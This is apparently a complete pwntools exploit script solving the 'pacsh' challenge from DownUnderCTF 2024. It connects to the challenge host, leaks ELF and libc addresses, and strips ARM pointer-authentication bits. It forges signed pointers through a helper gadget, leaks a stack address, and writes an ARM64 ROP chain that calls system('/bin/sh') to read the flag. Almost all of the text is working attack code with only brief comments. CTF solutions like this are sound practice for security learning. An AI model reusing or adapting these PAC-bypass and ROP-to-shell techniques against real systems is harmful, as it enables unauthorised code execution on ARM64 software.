from pwn import *

#process setup
context.binary = "./pacsh" #auto sets context.arch
libc = ELF("./libc.so.6")
r = connect("2024.ductf.dev", 30027)
#r = process()

#read initial addresses
r.readuntil(b"help: ")
help_addr = int(r.readline()[:-1].decode(), 16)

r.readuntil(b"ls: ")
ls_addr = int(r.readline()[:-1].decode(), 16)

r.readuntil(b"read64: ")
read64_addr = int(r.readline()[:-1].decode(), 16)

r.readuntil(b"write64: ")
write64_addr = int(r.readline()[:-1].decode(), 16)

#strip PAC from address and calculate ELF base
mask = 0xffffffffff
help_strip = help_addr & mask
elf_base = help_strip - context.binary.symbols['help']
builtins = elf_base + context.binary.symbols['BUILTINS']
print("elf base: " + hex(elf_base))
print("BUILTINS: " + hex(builtins))


#val and addr must be integers
def arbitrary_write(addr, val):
    r.sendline(hex(write64_addr).encode())
    r.sendline(hex(addr).encode() + b" " + hex(val).encode())

def arbitrary_read(addr):
    r.sendline(hex(read64_addr).encode())
    r.sendline(hex(addr).encode())
    r.readuntil(b"read64> ")
    out = r.readline()[:-1].decode()
    return int(out, 16)

def pac_address(addr):
    arbitrary_write(builtins + 8, addr)
    r.sendline(hex(help_addr).encode()) #call help

    #read pac address
    r.readuntil(b"help: ")
    return int(r.readline()[:-1].decode(), 16)

def call(addr):
    r.sendline(hex(pac_address(addr)))

#write "/bin/sh" in a known address
arbitrary_write(builtins + 0x10, u64(b"/bin/sh\x00"))
sh_addr = builtins + 0x10

#leak stack via elf -> libc -> stack
system_got = elf_base + context.binary.got['system'] #full RELRO means GOT is already populated
system_addr = arbitrary_read(system_got)
libc_base = system_addr - libc.symbols['system']
print("libc base: " + hex(libc_base))

stack_leak_addr = libc_base + 0x19d3c0
stack_leak = arbitrary_read(stack_leak_addr)
print("stack leak: " + hex(stack_leak))
stack_bottom = stack_leak - 0x312 #bottom of main frame
print("stack bottom: " + hex(stack_bottom))

#ROP system("sh")
arbitrary_write(stack_bottom + 8, elf_base + 0xa3c) #set x19 #ldr x19, [sp, #0x10] ; ldp x29, x30, [sp], #0x20 ; ret  ;
stack_bottom += 0x20
arbitrary_write(stack_bottom + 0x10, sh_addr) #val to set x19 equal to
arbitrary_write(stack_bottom + 8, libc_base + 0x73a00) #mov x0, x19; ldp x19, x20, [sp, #0x10] ; ldp x29, x30, [sp], #0x20 ; ret  ;
stack_bottom += 0x20
arbitrary_write(stack_bottom + 8, system_addr) #final gadget
r.clean()

call(elf_base + 0xa40) #start ROPing and pivot stack #ldp x29, x30, [sp], #0x20 ; ret  ;
r.sendline(b"cat flag.txt")
r.interactive()

